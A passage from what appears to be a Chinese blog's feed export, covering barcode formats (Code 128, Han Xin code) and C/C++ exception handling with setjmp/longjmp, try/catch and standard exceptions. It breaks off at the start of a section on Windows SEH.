dVXLst+88038sUXXziGbTabfPDBBx67u5k0aZL85je/kRs3bsi1a9eszEa5dP36dcnNzZW3335bHnroIbflqlSpIs8//7zhvVsdPIeD87oeP36813HuuusumTdvnoiIVKpUSdLS0uTgwYNBaZ8OyvsyOnTokGG4devWPt/9H4jSN+iIiNSqVcuv6TiP53zDUlZWlvz97393DEdERMjy5cslNjbW7TQbNGgg77//vthsNss3WwV7O+usqKhISkpK5PXXX5du3bq5LRcfHy8ZGRkSEfGfXfLRo0dl165dlupxFqr1VlhYKHPnzjW8l5GRISkpKW6n2bNnT5k6darhvYULF/rVPhGRGTNmyB//+EfHcHp6unz++edStWpVv6cJ/RBWNbF69WrZsGGDrFixQubOnSs9e/b0Ok5kZKT06NHD8J6ru3lFRNauXWsY7tWrl6U7Q+fNm+dxh+HO9evXDcO63wXZpk0bGTp0qNdype+QFbl552m4unS5dOmSYbhSpUqWxhs8eLCcO3dO8vLy5NChQ6Z5up2U92V08eJFw/Add9wR0vqvXLliGPY3ADj/KS7d96eIyMqVKw3DPXr0kObNm3ud7r333iv33Xef5XYEezvrSkpKigwfPtxruaZNm8qDDz5oaq8/QrXeNmzYIKdPn3YMd+nSRbp06eJ1us59KGdmZprabMXbb78ts2bNcgw3bNhQNm3aJDVr1vR5WuHA0/ms43GrmmjTpo1f49WrV88w7PyP+hbnI4B9+vSxNP2kpCQZNGiQ/OlPf/KpXT/++KNh2GpICJdhw4ZZKle9enWJj4939EdZUlIiOTk5kpiYGMzmueR81OP//u//ZNy4cV7Hi4qKkqSkpGA1SyvlfRk5h9VQf8/y8/MNw9HR0X5Nx3k855208xFE59DmycMPPyzbtm2zVDbY21lXBg8e7LVv01t69eolGzZscAx//fXXluspLVTrbf369Ybhn//855amm5qaKnv27JGqVatKYmKiJCYmGo4qW7FmzRoZO3asYzg5OVk2b94s9evX92k6oeS8H3TeT8I9jqyWc86nBN39U/vuu+8Mw23btrVch6dT465cu3bNsPOoXr26aWOvm06dOlku63y0wfkocqg479D/93//V2bPnm16elhFVt6X0dWrVw3Dof7TV1xcbBi2Grqc2e3G4yKFhYWGYefLHe6++27L0/ZlW+Yvq9tZV6wcabylVatWhmHn5WJVqNabc5j2ZV20a9dO7rzzTqlZs6bPQTUzM1MeffRRx3wmJCTIxo0bA3qYyKlTp0z9pvvz+te//uW2jkaNGhnOVG7cuNHwVEy4x5FVDSml5MCBA7Jjxw7597//LSdPnpSrV6/KjRs3TNdmHT9+3NI0nTs593RNkbMOHTpYLisi8vzzzxtOF40bN87njVGo1alTx3JZ507rrV4vV9aGDRsmb775puN6yqKiIpk6darMnTtX+vbtK7169ZJu3bpJampqWNqng/K+jKpVq2YY9udUaSCcw4pzCLLK+VIZ5yN2P/zwg2G4YcOGlqft/CQuq4KxnXXFyuUMtzhvl8+dOycFBQU+HxkN1Xo7cuSIYdiX/Yq/Dh06JP369XMcPa5cubKsX7/e8gMPwik2NlZGjhwpb775pojcvFZ74cKF8uyzz4a5ZfojrGqkuLhY/vCHP8j8+fMD2jg6u3btmukfsS+nE62cVsnNzZX9+/fL4sWLZdWqVY73W7ZsKZMmTbLe2DDR/TIFVypVqiTr16+XPn36yLfffut4Pzs7Wz766CP56KOPROTmdY49e/aUBx98UPr06VOhHn1b3pdRjRo1DMPOlwUEm/P16s6nl61yHq/0dPPz803bJ+eQ7okvZUWCt511Jzk52XLZhIQE03u5ubmm74E3oVhvN27cMD2e11X7y9KpU6ekd+/ehoMhAwcO9OnMWLjNnDlT1q9f7/iDNnHiRPn222/lySeflJYtW5oeyYqbCKuauHTpkjz88MOWH2nnC1enPH25aSouLk6io6OloKDA5efbtm2T7t27G96LiIiQIUOGyDvvvFMug2B5cccdd8ju3btlwYIF8vrrr7sMMydOnJDly5fL8uXLJS4uToYMGSJTp06VZs2ahaHFoVeel5HzdbOHDx8Oaf3Vq1c3DOfk5Pg1HecjwqX/LDsHHhHzaXdPIiMjJTY21lIgC+Z21h1fwoer+c7Ly/M5rIZivbnarwSzpwqllPTu3dt0nedHH30kv/zlL6Vfv34BTb9atWoyc+bMgKYh4v3PSY0aNeTLL7+Uxx9/XDZs2CBKKXnvvffkvffeE5Gb12937Ngx4HbcdsLXa1b5E6x+VouLi1WvXr0M0xYR1aVLF7V06VK1d+9edeLECZedOjv3Izlt2jRTmTNnzhjK2Gw2n+c9Li7ObT+GW7duNU1/4sSJPndC7U0wn2B1/vx5v8e99chHX5XVo0Rvyc/PV6tXr1ZPPPGEql+/vun7VPoVERGhpk2b5vWxjuFW0ZfR+vXrTe06ffp0yOrPz8839GEaHx/v13Sctx+l+zZ19eCDy5cv+zR95347XQn2dvaW0tt8X7e1169fN7XP1fbF234lFOvt0qVLprZevHjRr3rcsfqkscTERHXixAmfph2OflZLu3z5svqf//kf07zs2rUrpO0oL/S+kLCC+Pjjj2XTpk2OYZvNJm+//bZ88cUX8sQTT0jbtm2lQYMGfp8ecD6lqZTy6bRQQUGBx5uIqlSpIikpKY7uqZRSMm/ePGnatKns37/frzbDdzExMTJw4EBZunSp/Pjjj3Lw4EFZvHixDBgwwHRTWElJibz88ssycuTIMLU2PMrbMurcubPpeu/Sd4sHW0xMjOHmyNzcXFN3YN6cOXPGsP2oU6eOYZvk6pILX7ZP169ft3RNZrC3s64opXzqo9rV0Up/2hOK9eaqO6xQ9McdExMjf/zjHw03rl26dEkeffTRsHUj6KvMzExJS0uTt956y/FeRESEpKamcibSDcKqBt555x3D8KhRo2TUqFGWxrVyesfVzsDVqTd3fvrpJ4+ft2vXTrKysuT8+fMyY8YMx52np0+flm7duplu7kJoNG/eXJ5++mlZs2aNXLhwQVatWiWtW7c2lFm+fLls3LgxTC0MP92XUbVq1UztWbx4cZlN/9YfS0/XbrZo0cIwfODAAZ/qcP7D6nwjTOXKlU39MPtyI5m37dMtwd7OupOdne13WZvN5nd4DvZ6i4yMNF0vfObMGZ/q8FVycrJs3bpVhg8fLhkZGYbLEjIzM00PbdHRwYMHpWfPnnLhwgURuRm+586dKxcvXpQffvihXNwoFg6EVQ3s3bvXMPzkk09aHtfKk3UiIiJM19GcOHHCch179uyxVK5GjRry4osvymuvveZ47+rVqzJ9+nTLdSE4oqOjZfDgwbJnzx4ZMGCA4bNb10pVdLouI+ftwYEDB+Szzz4rk2n//ve/l0mTJklaWpoMHz5cjh49airTuXNnw7Cv13tu3rzZMHzvvfcahm02m6lrO1+2T1av4w32dtYd524DPXHVK4Lznf1WBXu9iZh7OnD1/SkrERERsnv3bsfNVA0aNJDly5cbysyZM8dw9FxHU6dONZw5+OCDD2TSpElBvzmtvCOshlleXp7pX7vVrlguX75seQN05513GoZ9uVHD16NKY8aMkbp16zqGV65cyZM6NGG3202PNvTlaTwVgW7LaNiwYaYn8owaNcr06Etf/fDDDzJ58mQRudl/5rvvvisZGRmmcs4dva/2YcxPAAAL5UlEQVRbt85yHUopU8fxffv2NZVzDj2+HAXcsWOH1zKh2s664hySPXH+nvnS7ZWzUKw356P+pR/p7c2f/vQnmTNnjuPlrWcGm81meoLbgAEDDA8GUErJ0KFDLR9tD7WcnBzD0yRbtmwpjzzySBhbVH4QVsPM1TU2VvvUW7hwoeUO6Z07m7b67zM7O9vlDswTu91ueA72jRs3gn56qKJRSsn3338vq1atcvTZZ1VKSorhOsjycp2Xr26XZRQXF2d6lvrZs2dl0KBBfve7eu7cOXnooYcM10g2aNBAJk6caCrbvn17SUtLcwzv27fPUkAUuRmQSh9ZbNGihcunSLVr184wbPUPcklJielRra6EajvrSumu/Lxxnu9A7goPxXrr37+/YXj16tWWDkwUFxfLhAkT5LnnnnO8/H3K1vz58w2h+ezZs/LYY49p2dn+8ePHDe26//77w9eYcoawGmbVqlUzXVDt6QkYt2RmZsqcOXNM77u7Psr5KVSrVq1yXDPjyZQpU0xP0bHCuZN9f/v5g2tPPfWUNGnSRB5++GF5+umnfTp6c/ToUcMGM9TPmw+V22kZTZgwQf7rv/7L8N7OnTula9euPp1mFrl5LWLHjh0N49ntdsnIyHB7c8fTTz9tGH7mmWe8hpK8vDxTH8sTJkxwWdb5sostW7ZYOvX+3nvvWTr1HKrtrCu7du2y9DjYI0eOmMLqkCFDLNfjSrDXW69evaR27dqO4bNnzxpuGnJn5cqVhjMD7du39+nBLKXFxMTIJ598Yri2d8uWLfLKK6/4Nb1gcl72vvTBW+GFrR+CcihYXVf16NHDMN2RI0d6nObatWtVlSpVVGRkpJo4caJh3F69erkcJz8/XyUnJxvKDhkyxGO3PIsXL1Y2m00lJSWp2NhYr13DlDZ58mRD+cOHD3sdxxu6rvqPzZs3G8Zt0qSJysrK8jpeQUGB6tevn2HcxYsX+9X+UGAZ/ceZM2dM3z0RUXa7XY0bN04dPXrU4/jff/+9Gjt2rLLb7YbxbTabWrp0qcdx8/PzVWpqqmG8QYMGqezsbJflL168qHr37m0o37x5c1VYWOi2jvT0dEP51q1bq5ycHLfld+zYoapUqaJsNpuKjo72un0KxXZWKWVqi4io1NRUj10r5efnqy5duhjG6dy5s9vyVvYrt6Yb7PW2ZMkSQ/no6Gi1bt06t+X379+vatasaRjno48+Cmg+lVJqxYoVhmlGRkaqf/zjH27Lh6Prqj179hjqnDdvXtDrvF0QVn0QrLD6/vvvmzZuEyZMUGfPnnWUKSgoUH/729/UoEGDHGWmTZumDhw4YBgvKipKbdmyxWU9ixYtMtXTo0cPtX37dsfGqKSkRO3atUsNHjzYsCGpVq0aYdXNuO7C6v79+9Wf//xnt6/27dsbpjNlyhS3ZTdu3Gia/oMPPmgYPz4+Xj3zzDNq8+bN6qefflJFRUWquLhYXbhwQR08eFAtW7ZMtWzZ0jBOw4YNPQaCYGMZ+ebMmTPqnnvuMf2Ob72aNWumRowYoaZNm6YWLlyoZs2apZ566il1zz33GPrdLL298BZUb/nHP/6hoqKiTDv45557Tn322WcqMzNTffbZZ2rixImmP8ZxcXFq3759Hqf/2WefuQx5y5YtU//+979VTk6OOn36tNq8ebN68sknHX2rDh061BTIXAnVdrb0n4EaNWo4tqW1atVSixcvVidPnjTV17ZtW1Pbdu7c6XZZ+RLigr3eiouL1f33328Yz2azqaFDh6r169er7777Th07dkxt2bJFjR071hTmPQV/X+ZTKaWGDh1qms8LFy64LEtYLV8Iqz4IVlgtKipSXbt2NW2sbDabqlevnkpOTlYRERGGz/r27asKCgpUUVGRqlOnjmncWrVqqaSkJJWfn29of58+fVzu5Ox2u0pKSjJ1wjxixAillCKsehjXXVh11eGzvy9X83r+/HnVokULj+O5Ciild6S7d+/2exmWBZaR765evaqeeOIJU0f4vr6aNGmivvzyS5/qzsjIMAUfb6+4uDi1du1aS9MfO3asT9NOS0tTly9fVs2aNTO8X1xcbJp2qLazpT+vV6+eOnfunClMV65cWdWqVcvtOpw7d67H5eRriAv2esvJyVEdOnTw+TvYrl07deXKlTKbz9zcXJWWlmaoo0+fPi7PIBJWyxfCqg+CFVaVurlTdf536uoVHR2tpkyZYjgt84c//MFt+evXrxvqycvLU48//rjXemJjY9Urr7zi+JETVt2PG66wqtTNjfOYMWNcnnr09BowYID6/vvv/Vp2ZYll5L9Dhw6pQYMGmQKWt1eTJk3Um2++qQoKCvyqd8eOHaZT9u5ebdu29XpkrrSSkhL1/PPPW1pXXbt2dTzNyzkoXbt2zeX0g72dzc/PN7zftGlTpZRSJ06csBTmqlSpot544w2vy8nXEKdUcNebUkpdu3ZNTZ061dK6i46OVuPHjzftn8piPvft22dqw/z5803lCKvlC2HVB8EMq0rd3FB/+umn6pFHHlENGzZUcXFxKioqSiUlJakuXbqomTNnqmPHjrkcd8WKFapNmzYqNjZWVa5cWTVt2lSNHj1aFRUVuSy/a9cu9fTTT6u77rpL1ahRQ9ntdpWYmKg6deqkXnjhBVMAq1SpkmM+YmNjvc43YTU0QeyW06dPqzfffFMNGTJE3XXXXSoxMVFFR0cru92uEhISVOPGjVX//v3VK6+84vXaxlBiGQXu9OnTasmSJWrYsGGqXbt2jjMkkZGRKiEhQaWmpqrevXurGTNmqMzMzDKps7i4WK1bt0499dRTqmXLliopKUlFRUWp5ORk1bZtW/XMM8+oLVu2+P2o2qNHj6oXXnhBdejQQdWuXVtFR0erpKQk1bJlSzVy5Ei1fft2w7Qfeughy7/nYG5nL168aGhHhw4dDMts8+bNavjw4eruu+9WSUlJKjo6WtWpU0d17txZvfzyy5avf/cnxN1qQzDXm1JKnTx5Ui1atEj16tVLpaWlqapVqzrm87777lMvvfSS5Uej+jufzpe8RUVFqa+++spQhrBavtiUUkoAD4qKiiQqKsoxXKdOHTl9+rTHcaZMmSJz5851DB8+fFjS09OD1kYAAHT29ddfS/v27R3D8+bNk2effTaMLSo/6LoKXjl3jVO6w3+r+E8EAKjI2A/6j7BawRQWFsqRI0dMj9Lz5O9//7thuEOHDl7HcX7Wtz99tQIAcLvIzc01DDvvJ+EeYbWCKCgokGbNmklcXJw0bdpUevXqJTt37vQ63o0bN0xP/3HunNyV+Ph4w7CVDrgBALhdHTp0yDBctWrVMLWk/CGsVhDR0dHSokULKS4udrz35JNPenyGcnFxsYwePVqOHDnieC81NdXlM6KdNW7c2DDs6yNbAQC4nXz44YeG4UaNGoWpJeUPYbUCefHFFyUmJsYxfPDgQbnnnnvklVdekYMHD0pOTo4UFxfLqVOn5OOPP5aOHTvKihUrDNN47bXXJDIy0mtd3bt3N9yU9fnnn8v06dMDesY2AADlTU5OjowdO1a++uorx3tVq1aVTp06hbFV5Qu9AVQwH3/8sQwdOlSKiop8Hvell16S6dOnWy4/evRoWbJkieG92NhYSU1NlejoaFmxYoW0bt3a53YgOMaPHy9btmwJej0jR450+6xx3bGMAFjx9ddfy8iRIyU/P1+ysrKkoKDA8PmMGTPkxRdfDFPryh97uBuA0PrVr34ldevWlTFjxpiun3GnYcOGsnDhQhk8eLBPdc2bN0++/fZbyczMdLyXn58vhw8fFhFuutLN8ePH5eDBg0Gvx9OlJ7pjGQGw4urVq3LgwAGXn/Xt21dmzJgR4haVb4TVCqhbt27yz3/+UzZt2iSrV6+W/fv3S1ZWluTk5IjNZpPq1atL7dq1pUOHDtKzZ08ZOHCg2O2+f1Xi4+Nl69atsnTpUsnIyJCDBw9KdnZ2EOYIAAA92Ww2SUhIkJYtW8rjjz8uw4YNk4gIrsL0BZcBAAAAQFtEewAAAGiLsAoAAABtEVYBAACgLcIqAAAAtEVYBQAAgLb+H5YdX72+/34/AAAAAElFTkSuQmCC" alt="生成的图像">
<figcaption aria-hidden="true">生成的图像</figcaption>
</figure>
<p>使用 FNC4 移位字符时 128 个低位 ASCII 字符和完整的 256 个字符扩展
ASCII 集。</p>
<h2 id="汉信码">汉信码</h2>
<figure>
<img src="/barcode-note/image-20220728225529360.png" alt="image-20220728225529360">
<figcaption aria-hidden="true">image-20220728225529360</figcaption>
</figure>
<p>汉信码由中国物品编码中心牵头自主研制，是拥有完全自主知识产权的二维码码制，具有知识产权免费、支持任意语言编码、汉字信息编码能力超强、极强抗污损、抗畸变识读能力、识读速度快、信息密度高、信息容量大、纠错能力强等突出特点，达到国际领先水平。汉信码实现了我国二维码底层技术的后来居上，可在我国多个领域行业实现规模化应用，为我国应用二维码技术提供了可靠的核心技术支撑。</p>
<h1 id="条形码的生成与识别">条形码的生成与识别</h1>
<h2 id="条形码生成">条形码生成</h2>
<ul>
<li>https://products.aspose.app/barcode/generate</li>
</ul>
<h2 id="条形码识别">条形码识别</h2>
<ul>
<li>https://products.aspose.app/barcode/recognize</li>
</ul>
<h2 id="汉新码识别">汉新码识别</h2>
<p>使用中国编码 APP。</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>barcode</tag>
      </tags>
  </entry>
  <entry>
    <title>有关 C/C++ 的异常处理方式笔记</title>
    <url>//cexception-note.html</url>
    <content><![CDATA[<h1 id="c-的异常处理">C 的异常处理</h1>
<p>在 C 语言中最常使用 <code>setjmp.h</code> 库处理我们的异常。</p>
<p>最简单的异常处理，我们会使用其中的两个函数：<code>setjmp</code> 和
<code>longjmp</code></p>
<h2 id="jmp_buf-数组"><code>jmp_buf</code> 数组</h2>
<p><code>jmp_buf</code> 在 MSVC 中被定义为 <code>DWORD</code> 数组。</p>
<p><code>jmp_buf</code> 被用来保存跳转现场，即用来保存当前调用的
ESP、EIP、EBP、EBX、EDI、ESI 等寄存器和标志位的信息。</p>
<h2 id="setjmp-函数"><code>setjmp</code> 函数</h2>
<p><code>setjmp</code> 需要接收一个 <code>jmp_buf</code>
数组指针，将这个时候调用 <code>setjmp</code> 时的寄存器状态保存在
<code>jmp_buf</code> 里，然后返回 <code>0</code>
代表跳转点设置成功。</p>
<p>当 <code>long_jmp</code> 被调用后，会让 <code>setjmp</code>
函数返回一个值代表此次运行为跳转运行。</p>
<p>代码示例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">jmp_buf jb;</span><br><span class="line">setjmp(jb);</span><br></pre></td></tr></table></figure>
<h2 id="long_jmp-函数"><code>long_jmp</code> 函数</h2>
<p><code>long_jmp</code> 需要接收一个 <code>jmp_buf</code>
数组指针和一个自定义 <code>int</code> 类型信息 (会作为跳转后
<code>set_jmp</code> 的返回值)。</p>
<p>它会根据传入的 <code>jmp_buf</code>
数组还原寄存器信息，即跳转到上一次调用 <code>set_jmp(jmp_buf)</code>
的时刻，然后将传入的 <code>int</code> 类型值作为 <code>set_jmp</code>
的返回值返回。</p>
<blockquote>
<p>注意非必要不要传 <code>0</code>，否则无法分辨 <code>set_jmp</code>
是跳转回来的还是正常运行的。</p>
</blockquote>
<p>代码示例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">longjmp(jb, <span class="number">-1</span>)</span><br></pre></td></tr></table></figure>
<h2 id="完整示例">完整示例</h2>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">jmp_buf jb;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">calc</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (x == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		longjmp(jb, <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="number">10</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		longjmp(jb, <span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">10</span> / x;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> num;</span><br><span class="line">	<span class="type">int</span> msg;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Pls. input a number to calc: &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line"></span><br><span class="line">	msg = setjmp(jb);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;the value is %d.\n&quot;</span>, calc(num));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (msg == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;number can not be 0...\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (msg == <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;calc() do not like 10...\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;I do not know what happened...\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="c-的异常处理-1">C++ 的异常处理</h1>
<p>在 C++ 中最常使用 C++ 标准所提供的 <code>try - catch - throw</code>
异常处理模块来处理我们的异常。</p>
<h2 id="try---catch-块"><code>try - catch</code> 块</h2>
<p><code>try</code> 块中的代码被称为保护代码，后面通常跟着一个或多个
<code>catch</code> 块。</p>
<p><code>catch</code> 块跟在 <code>try</code>
块后面，用于捕获异常。可以指定想要捕捉的异常类型，这是由 catch
关键字后的括号内的异常声明决定的。</p>
<p>代码示例：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">// 保护代码</span></span><br><span class="line">&#125;<span class="built_in">catch</span>( ExceptionName e1 )</span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">// catch 块</span></span><br><span class="line">&#125;<span class="built_in">catch</span>( ExceptionName e2 )</span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">// catch 块</span></span><br><span class="line">&#125;<span class="built_in">catch</span>( ExceptionName eN )</span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">// catch 块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="throw-语句"><code>throw</code> 语句</h2>
<p>当问题出现时，程序会抛出一个异常。这是通过使用 <code>throw</code>
关键字来完成的。</p>
<p>其中 <code>throw</code> 后跟着的信息与 <code>catch</code>
的接收有关。(即 <code>throw</code> 什么就 <code>catch</code> 什么)</p>
<p>代码示例：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">double</span> <span class="title">division</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>( b == <span class="number">0</span> )</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="string">&quot;Division by zero condition!&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> (a/b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="完整示例-1">完整示例</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">division</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (b == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="string">&quot;Division by zero condition!&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (a / b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> x = <span class="number">50</span>;</span><br><span class="line">	<span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line">	<span class="type">double</span> z = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		z = <span class="built_in">division</span>(x, y);</span><br><span class="line">		cout &lt;&lt; z &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">catch</span> (<span class="type">const</span> <span class="type">char</span>* msg) &#123;</span><br><span class="line">		cerr &lt;&lt; msg &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="标准异常">标准异常</h2>
<p>C++ 提供了一系列标准的异常，定义在 <code>&lt;exception&gt;</code>
中，我们可以在程序中使用这些标准的异常。它们是以父子类层次结构组织起来的，如下所示：</p>
<figure>
<img src="/cexception-note/exceptions_in_cpp.png" alt="C++ 异常的层次结构">
<figcaption aria-hidden="true">C++ 异常的层次结构</figcaption>
</figure>
<p>下表是对上面层次结构中出现的每个异常的说明：</p>
<table>
<colgroup>
<col style="width: 28%">
<col style="width: 71%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">异常</th>
<th style="text-align: left;">描述</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><strong><code>std::exception</code></strong></td>
<td style="text-align: left;">该异常是所有标准 C++ 异常的父类。</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>std::bad_alloc</code></td>
<td style="text-align: left;">该异常可以通过 <code>new</code>
抛出。</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>std::bad_cast</code></td>
<td style="text-align: left;">该异常可以通过 <code>dynamic_cast</code>
抛出。</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>std::bad_exception</code></td>
<td style="text-align: left;">这在处理 C++
程序中无法预期的异常时非常有用。</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>std::bad_typeid</code></td>
<td style="text-align: left;">该异常可以通过 <code>typeid</code>
抛出。</td>
</tr>
<tr class="even">
<td style="text-align: left;"><strong><code>std::logic_error</code></strong></td>
<td style="text-align: left;">理论上可以通过读取代码来检测到的异常。</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>std::domain_error</code></td>
<td style="text-align: left;">当使用了一个无效的数学域时，会抛出该异常。</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>std::invalid_argument</code></td>
<td style="text-align: left;">当使用了无效的参数时，会抛出该异常。</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>std::length_error</code></td>
<td style="text-align: left;">当创建了太长的 std::string
时，会抛出该异常。</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>std::out_of_range</code></td>
<td style="text-align: left;">该异常可以通过方法抛出，例如
<code>std::vector</code> 和
<code>std::bitset&lt;&gt;::operator[]()</code>。</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><strong><code>std::runtime_error</code></strong></td>
<td style="text-align: left;">理论上不可以通过读取代码来检测到的异常。</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>std::overflow_error</code></td>
<td style="text-align: left;">当发生数学上溢时，会抛出该异常。</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>std::range_error</code></td>
<td style="text-align: left;">当尝试存储超出范围的值时，会抛出该异常。</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>std::underflow_error</code></td>
<td style="text-align: left;">当发生数学下溢时，会抛出该异常。</td>
</tr>
</tbody>
</table>
<p>同时我们也可以自定义异常，代码示例：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;exception&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里可以不继承 exception 来创建自己的异常标准。</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">MyException</span> : <span class="keyword">public</span> exception</span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="type">const</span> <span class="type">char</span>* <span class="title">what</span><span class="params">()</span> <span class="type">const</span> <span class="title">throw</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;C++ Exception&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">try</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="built_in">MyException</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">catch</span> (MyException&amp; e)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;MyException caught&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		std::cout &lt;&lt; e.<span class="built_in">what</span>() &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">catch</span> (std::exception&amp; e)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//其他的错误</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="windows-seh-结构化异常处理机制">Windows SEH
结构化异常处理机制</h1>
<p>Windows SEH
结构化异常处理机制核心是由系统维护的一个单向链表，链表中保存每个异常处理函数的指针。</p>
<p>调用机制类似 C++ 的异常处理：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 保护代码</span></span><br><span class="line">&#125;</span><br><span class="line">__except ()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 异常处理后的内容块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中 <code>__except</code> 需要一个宏定义常量，通常是
<code>EXCEPTION_CONTINUE_EXECUTION</code>、<code>EXCEPTION_EXECUTE_HANDLER</code>
